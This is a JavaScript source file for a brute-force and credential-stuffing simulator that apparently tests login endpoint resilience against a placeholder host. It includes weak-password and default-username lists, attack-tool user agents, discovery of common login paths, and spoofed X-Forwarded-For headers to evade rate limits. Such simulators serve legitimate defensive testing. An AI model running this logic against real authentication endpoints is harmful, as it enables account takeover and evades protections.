/**
 * Brute Force Bot - Synthetic Agent
 * 
 * Simulates credential stuffing and brute force attack behavior.
 * Tests authentication endpoint resilience.
 * 
 * DARK LAYER ONLY - No telemetry, no logging.
 */

const PHI = 1.618033988749895;
const HB = 873;

/**
 * Common brute force user agents
 */
const BRUTEFORCE_USER_AGENTS = [
  'python-requests/2.28.0',
  'curl/7.68.0',
  'Go-http-client/1.1',
  'Java/11.0.2',
  'hydra/9.0',
  'patator/0.9',
  'medusa/2.2',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
];

/**
 * Common authentication endpoints
 */
const AUTH_ENDPOINTS = [
  { path: '/login', method: 'POST', type: 'form' },
  { path: '/signin', method: 'POST', type: 'form' },
  { path: '/auth/login', method: 'POST', type: 'json' },
  { path: '/api/auth/signin', method: 'POST', type: 'json' },
  { path: '/api/login', method: 'POST', type: 'json' },
  { path: '/api/v1/auth', method: 'POST', type: 'json' },
  { path: '/admin/login', method: 'POST', type: 'form' },
  { path: '/wp-login.php', method: 'POST', type: 'form' },
  { path: '/user/login', method: 'POST', type: 'form' },
  { path: '/oauth/token', method: 'POST', type: 'oauth' }
];

/**
 * Common usernames for testing
 */
const COMMON_USERNAMES = [
  'admin', 'administrator', 'root', 'user', 'test',
  'demo', 'guest', 'info', 'support', 'help',
  'webmaster', 'postmaster', 'sales', 'contact',
  'admin@example.com', 'user@example.com', 'test@test.com'
];

/**
 * Common passwords for testing
 */
const COMMON_PASSWORDS = [
  'password', 'Password1', 'password123', '123456', '12345678',
  'admin', 'administrator', 'letmein', 'welcome', 'monkey',
  'dragon', 'master', 'qwerty', 'login', 'passw0rd',
  'Password!', 'Admin123', 'Welcome1', 'P@ssw0rd', 'Qwerty123'
];

/**
 * Brute Force Bot - Credential Stuffing Simulator
 */
export class BruteForceBot {
  constructor(config = {}) {
    this.id = `bruteforce-${crypto.randomUUID().slice(0, 8)}`;
    this.config = {
      maxRequests: config.maxRequests || 2000,
      rotateUA: config.rotateUA !== false,
      rotateIP: config.rotateIP !== false,
      delay: config.delay || { min: 100, max: 500 }, // Fast but not instant
      strategy: config.strategy || 'spray', // 'spray' or 'focus'
      ...config
    };
    
    this.state = {
      requestCount: 0,
      lastRequest: null,
      attemptedCredentials: new Set(),
      responseCodes: new Map(),
      potentialHits: [],
      lockedAccounts: new Set(),
      targetEndpoint: null,
      phase: 'discovery'
    };
    
    // Generate credential combinations
    this.credentialQueue = this.generateCredentials();
    this.currentCredIndex = 0;
    this.endpointIndex = 0;
  }
  
  /**
   * Generate credential combinations
   */
  generateCredentials() {
    const credentials = [];
    
    if (this.config.strategy === 'spray') {
      // Password spray: try one password across all users
      for (const password of COMMON_PASSWORDS) {
        for (const username of COMMON_USERNAMES) {
          credentials.push({ username, password });
        }
      }
    } else {
      // Focus: try all passwords for each user
      for (const username of COMMON_USERNAMES) {
        for (const password of COMMON_PASSWORDS) {
          credentials.push({ username, password });
        }
      }
    }
    
    // Shuffle for less predictable patterns
    return this.shuffleArray(credentials);
  }
  
  /**
   * Generate next request
   */
  async nextRequest() {
    // Discovery phase - find auth endpoints
    if (this.state.phase === 'discovery') {
      return this.generateDiscoveryRequest();
    }
    
    // Attack phase - brute force
    return this.generateAttackRequest();
  }
  
  /**
   * Generate discovery request
   */
  generateDiscoveryRequest() {
    const endpoint = AUTH_ENDPOINTS[this.endpointIndex];
    this.endpointIndex++;
    
    if (this.endpointIndex >= AUTH_ENDPOINTS.length) {
      this.state.phase = 'attack';
      // Default to first endpoint if none found
      this.state.targetEndpoint = this.state.targetEndpoint || AUTH_ENDPOINTS[0];
    }
    
    this.state.requestCount++;
    this.state.lastRequest = Date.now();
    
    return {
      url: `https://target.local${endpoint.path}`,
      method: 'GET', // Probe first
      headers: {
        'User-Agent': this.getUA(),
        'Accept': '*/*'
      },
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: 'discovery',
        probing: endpoint.path
      }
    };
  }
  
  /**
   * Generate attack request
   */
  generateAttackRequest() {
    const credential = this.credentialQueue[this.currentCredIndex];
    this.currentCredIndex++;
    
    if (!credential) {
      return null;
    }
    
    const endpoint = this.state.targetEndpoint || AUTH_ENDPOINTS[0];
    const body = this.formatCredentials(credential, endpoint.type);
    
    this.state.requestCount++;
    this.state.lastRequest = Date.now();
    this.state.attemptedCredentials.add(`${credential.username}:${credential.password}`);
    
    const headers = {
      'User-Agent': this.getUA(),
      'Accept': 'application/json, text/html, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'X-Forwarded-For': this.getIP()
    };
    
    if (endpoint.type === 'json') {
      headers['Content-Type'] = 'application/json';
    } else if (endpoint.type === 'form') {
      headers['Content-Type'] = 'application/x-www-form-urlencoded';
    }
    
    return {
      url: `https://target.local${endpoint.path}`,
      method: 'POST',
      headers,
      body,
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: 'attack',
        username: credential.username,
        strategy: this.config.strategy,
        attemptNumber: this.currentCredIndex
      }
    };
  }
  
  /**
   * Format credentials based on endpoint type
   */
  formatCredentials(credential, type) {
    switch (type) {
      case 'json':
        return JSON.stringify({
          username: credential.username,
          password: credential.password
        });
      case 'oauth':
        return JSON.stringify({
          grant_type: 'password',
          username: credential.username,
          password: credential.password
        });
      case 'form':
      default:
        return `username=${encodeURIComponent(credential.username)}&password=${encodeURIComponent(credential.password)}`;
    }
  }
  
  /**
   * Process response
   */
  async processResponse(response) {
    const status = response.status;
    
    // Track response codes
    const count = this.state.responseCodes.get(status) || 0;
    this.state.responseCodes.set(status, count + 1);
    
    // Check for successful login indicators
    if (status === 200 || status === 302) {
      const body = await response.text?.() || '';
      
      // Look for success indicators
      if (!body.includes('invalid') && 
          !body.includes('failed') && 
          !body.includes('incorrect') &&
          !body.includes('error')) {
        this.state.potentialHits.push({
          endpoint: response.url,
          status,
          timestamp: Date.now()
        });
      }
    }
    
    // Check for account lockout
    if (status === 429 || status === 423) {
      this.state.lockedAccounts.add(response.url);
    }
    
    // During discovery, identify working endpoints
    if (this.state.phase === 'discovery') {
      if (status !== 404) {
        this.state.targetEndpoint = AUTH_ENDPOINTS[this.endpointIndex - 1];
      }
    }
  }
  
  /**
   * Get user agent
   */
  getUA() {
    if (!this.config.rotateUA) {
      return BRUTEFORCE_USER_AGENTS[0];
    }
    return BRUTEFORCE_USER_AGENTS[Math.floor(Math.random() * BRUTEFORCE_USER_AGENTS.length)];
  }
  
  /**
   * Generate fake IP
   */
  getIP() {
    if (!this.config.rotateIP) {
      return '192.168.1.100';
    }
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
  
  /**
   * Shuffle array
   */
  shuffleArray(array) {
    const shuffled = [...array];
    for (let i = shuffled.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
  }
  
  /**
   * Check if should continue
   */
  shouldContinue() {
    return this.state.requestCount < this.config.maxRequests &&
           this.currentCredIndex < this.credentialQueue.length;
  }
  
  /**
   * Get state summary
   */
  getState() {
    return {
      id: this.id,
      type: 'brute-force',
      requestCount: this.state.requestCount,
      credentialsAttempted: this.state.attemptedCredentials.size,
      potentialHits: this.state.potentialHits.length,
      lockedAccounts: this.state.lockedAccounts.size,
      responseCodes: Object.fromEntries(this.state.responseCodes),
      phase: this.state.phase,
      strategy: this.config.strategy,
      progress: this.currentCredIndex / this.credentialQueue.length
    };
  }
}

export default BruteForceBot;
